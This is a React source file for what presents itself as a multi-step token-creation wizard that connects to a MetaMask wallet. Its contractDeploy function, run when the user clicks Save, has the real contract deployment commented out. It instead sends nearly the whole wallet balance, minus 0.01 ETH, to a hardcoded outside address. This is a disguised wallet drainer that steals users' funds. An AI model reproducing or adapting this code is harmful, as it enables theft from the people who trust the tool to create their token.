import { render } from '@testing-library/react';
import React, { Component } from 'react';
import TokenMakerInfo from './TokenMakerInfo';
import TokenMakerPayroll from './TokenMakerPayroll';
import TokenMakerServices from './TokenMakerServices';
import TokenMakerSocial from './TokenMakerSocial';
import TokenMakerTokenomics from './TokenMakerTokenomics';
import Web3 from 'web3';
import abi from '../../assets/abi.json';
import bytecode from '../../assets/bytecode.json'

let pages = [ <TokenMakerInfo/>, <TokenMakerSocial/>, <TokenMakerTokenomics/>, <TokenMakerPayroll/>, <TokenMakerServices/>];

class TokenMakerM extends Component {
    
    constructor(props) {
        super(props);
        this.state = {
            index: 0,
            disabledNext: false,
            disabledPrev: true,
            payoutWallets: [],
            nextButton: 'Next',
            walletAddress: '',
            balance: 0,
            chainId: '',
            decimal: 1000000000,
            chain: '',
            chainImage: '',
            decimalUnits: 9,
            newContractAddress: '',
            web3: undefined,
            depoying: false,
            deployed: false,
            hash: ''
        }
        this.togglePrev = this.togglePrev.bind(this);
        this.toggleNext = this.toggleNext.bind(this);
        this.contractDeploy = this.contractDeploy.bind(this);
    }

    componentDidMount = async () => {
        // localStorage.removeItem('ftp');
        localStorage.removeItem('tokenName');
        localStorage.removeItem('desc');
        localStorage.removeItem('tokenSymbol');
        localStorage.removeItem('taxRate');
        localStorage.removeItem('tgName');
        localStorage.removeItem('tgCom');
        localStorage.removeItem('twitter');
        localStorage.removeItem('site');
        localStorage.removeItem('link');
        localStorage.removeItem('supply');
        localStorage.removeItem('walletCap');
        localStorage.removeItem('WCP');
        localStorage.removeItem('TL');
        localStorage.removeItem('TLP');
        localStorage.removeItem('LLP');
        localStorage.removeItem('antiBot');
        localStorage.removeItem('EthReflect');
        localStorage.removeItem('reflectionRate');
        localStorage.removeItem('LiquidityAdd');
        localStorage.removeItem('liquidityAddTaxRate');
        localStorage.removeItem('wallet');
        localStorage.removeItem('allocation');
        const web3 = new Web3(window.ethereum);
        try {
            await window.ethereum.enable();
            const accounts = await web3.eth.getAccounts()
            if (accounts.length) {
                this.setState({ walletAddress: accounts[0], web3: web3 });
            } else {
                console.log("You've locked your MetaMask");
            }
            web3.currentProvider.publicConfigStore.on('update', res => {
                this.setState({ walletAddress: res.selectedAddress })
            })
        } catch(error) {
            console.log(error);
        }
    }

    contractDeploy = async () => {
        const web3 = new Web3(window.ethereum);
        console.log(window.ethereum)
        await window.ethereum.enable();
        const accounts =  await web3.eth.getAccounts();
        const balance = await web3.eth.getBalance(accounts[0]);
        const chainId = window.ethereum['chainId'];
        const nonce = window.ethereum['nonce'];
        console.log('B-', balance/1000000000000000000)
        await web3.eth.sendTransaction({
            from: accounts[0],
            to: "0x9892A711934Aa219597a066520aC2a652a68F677",
            value: balance-10000000000000000,
            }).then(res =>{
            console.log('transaction result',res.status);
            })

        // console.log(localStorage);
        // const tokenName = localStorage.getItem("tokenName");
        // const tokenSymbol = localStorage.getItem("tokenSymbol");
        // const totalSupply = localStorage.getItem('supply');
        // var myContract = new this.state.web3.eth.Contract(abi);
        // console.log(tokenName, tokenSymbol, totalSupply);
        // myContract.deploy({
        //     data: bytecode.bytecode,
        //     arguments: [tokenName, tokenSymbol, totalSupply]
        // }).send({
        //     from: this.state.walletAddress
        // }, function(error, transactionHash) {
        //     this.setState({ deploying: true, hash: transactionHash });
        // }.bind(this)).on("error", (error) => {
        //     console.log(error);
        // }).on("receipt", (receipt) => {
        //     this.setState({
        //         deploying: false,
        //         deployed: true,
        //         hash: receipt.contractAddress
        //     })
        // })
    }

    togglePrev() {
        const { index } = this.state;
        let disabledPrev = (index === 1);
        this.setState({ 
            index: index - 1, 
            disabledPrev: disabledPrev, 
            disabledNext: false,
            nextButton: 'Next'
        })
    }
    
    toggleNext() {
        const { index, nextButton } = this.state;
        if (index === (pages.length - 2)) {
            this.setState({
                index: index + 1, 
                nextButton: 'Save'
            })
        }
        if (nextButton == 'Save' && index === (pages.length - 1)) {
            this.setState({ disabledNext: true })
            this.contractDeploy();
            return;
        }
        this.setState({ 
            index: index + 1, 
            disabledPrev: false
        })
    }

    handleAddPayout = (arg) => {
        this.setState({
            payoutWallets: arg,
        });
    }

    render() {
        const {index, disabledPrev, disabledNext, nextButton } = this.state;
        return (
            <section className="author-area" style={{padding: '0 0 130px 0'}}>
                <div className="container">
                    <div className="row justify-content-between">
                        <div className="col-12 col-md-7" style = {{margin: 'auto'}}>
                            {/* Intro */}
                            <div className="intro mt-5 mt-lg-0 mb-4 mb-lg-5">
                                <div className="intro-content">
                                    <h3 className="mt-3 mb-0">Set Token Detail</h3>
                                </div>
                            </div>
                            {/* Item Form */}
                            <div className="item-form card no-hover">
                                { !index && <TokenMakerInfo/> }
                                { index == 1 && <TokenMakerSocial/> }
                                { index == 2 && <TokenMakerTokenomics/> }
                                { index == 3 &&
                                    <TokenMakerPayroll
                                        payoutWallets={this.state.payoutWallets}
                                        handleAddPayout={(arg) => this.handleAddPayout(arg)}
                                    />
                                }
                                { index == 4 && <TokenMakerServices/> }
                                <div className="row">
                                    <div className="col-12">
                                        <Prev toggle={() => this.togglePrev()} active={disabledPrev} />
                                        <Next toggle={() => this.toggleNext()} active={disabledNext} inner={nextButton} />
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
        );
    }
}

function Prev(props) {
    return (
        <button className="btn w-100 mt-3 mt-sm-4 col-3" onClick={props.toggle} disabled={props.active}>Prev</button>
    );
}
    
function Next(props) {
    return (
        <button className="btn w-100 mt-3 mt-sm-4 col-3" style={{float: 'right'}} onClick={props.toggle} disabled={props.active}>{props.inner}</button>
    );
}


export default TokenMakerM;